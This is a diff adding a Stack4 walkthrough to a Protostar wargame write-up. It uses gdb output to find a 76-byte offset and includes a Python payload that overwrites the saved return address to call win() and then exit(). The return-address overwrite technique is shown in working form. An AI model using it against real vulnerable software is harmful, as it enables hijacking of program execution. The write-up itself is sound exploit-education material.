@@ -172,3 +172,101 @@ user@protostar:/opt/protostar/bin$ ./stack3 </tmp/s3.txt
 calling function pointer, jumping to 0x08048424
 code flow successfully changed
 ```
+
+Stack4 :
+
+Disassembly of binary is as follows
+```
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x08048408 <main+0>:    push   ebp
+0x08048409 <main+1>:    mov    ebp,esp
+0x0804840b <main+3>:    and    esp,0xfffffff0
+0x0804840e <main+6>:    sub    esp,0x50
+0x08048411 <main+9>:    lea    eax,[esp+0x10]
+0x08048415 <main+13>:   mov    DWORD PTR [esp],eax
+0x08048418 <main+16>:   call   0x804830c <gets@plt>
+0x0804841d <main+21>:   leave
+0x0804841e <main+22>:   ret
+End of assembler dump.
+```
+Here buffer starts at esp+0x10 and extends until esp+0x10+0x40(64 bytes). we can make the code execute win() function if we can control eip register. Before calling a function, cpu pushes next instruction onto the stack so that it can return to that instruction aftter returning from function and then changes eip to the address present in the instruction. So here if we can overwrite RA with address of win() we can redirect code execution.
+
+In order to control eip, we need to overwrite saved ebp and the address below that(which will be in eip after return) . The length of payload can either be found by using unique pattern and check the offset which overwrote eip after crash or by manual inspection. 
+
+Here it occurs after 76 bytes
+```
+(gdb) b *0x0804841d
+Breakpoint 1 at 0x804841d: file stack4/stack4.c, line 16.
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /opt/protostar/bin/stack4 < /tmp/s4.txt
+
+Breakpoint 1, main (argc=0, argv=0xbffff864) at stack4/stack4.c:16
+16      stack4/stack4.c: No such file or directory.
+        in stack4/stack4.c
+(gdb) x/28x $esp
+0xbffff760:     0xbffff770      0xb7ec6165      0xbffff778      0xb7eada75
+0xbffff770:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff780:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff790:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff7a0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff7b0:     0x41414141      0x41414141      0x41414141      0x42424242
+0xbffff7c0:     0x00000000      0xbffff864      0xbffff86c      0xb7fe1848
+(gdb) i r
+eax            0xbffff770       -1073744016
+ecx            0xbffff770       -1073744016
+edx            0xb7fd9334       -1208118476
+ebx            0xb7fd7ff4       -1208123404
+esp            0xbffff760       0xbffff760
+ebp            0xbffff7b8       0xbffff7b8
+esi            0x0      0
+edi            0x0      0
+eip            0x804841d        0x804841d <main+21>
+eflags         0x200246 [ PF ZF IF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+```
+as seen from here leave instruction will set esp to ebp and ret will pop the address at top of the stack and loads it in eip. So eip after ret should be 0x42424242 and it is expected to cause a seg.fault
+```
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+```
+Now that we have control over eip, we need to replace 0x42424242 with address of win(), which is at 0x080483f4
+
+```
+import struct
+
+win_addr = 0x080483f4
+print "A"*76+struct.pack("<I",win_addr)
+```
+Above python script works and it causes segfault because after executing win() function, next address on stack is null terminator. This can be avoided by making sure that next address on stack is the address of exit.
+```
+user@protostar:/opt/protostar/bin$ python ~/asd.py > /tmp/s4.txt
+user@protostar:/opt/protostar/bin$ ./stack4 < /tmp/s4.txt
+code flow successfully changed
+Segmentation fault
+```
+Final pytohn code is :
+```
+import struct
+
+win_addr = 0x080483f4
+exit_addr = 0xb7ec60c0    ; obtained through gdb command > (p exit) and output is $2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
+print "A"*76+struct.pack("<I",win_addr)+struct.pack("<I",exit_addr)
+
+```
+and output is 
+```
+user@protostar:/opt/protostar/bin$ ./stack4 < /tmp/s4.txt
+code flow successfully changed
+user@protostar:/opt/protostar/bin$
+```
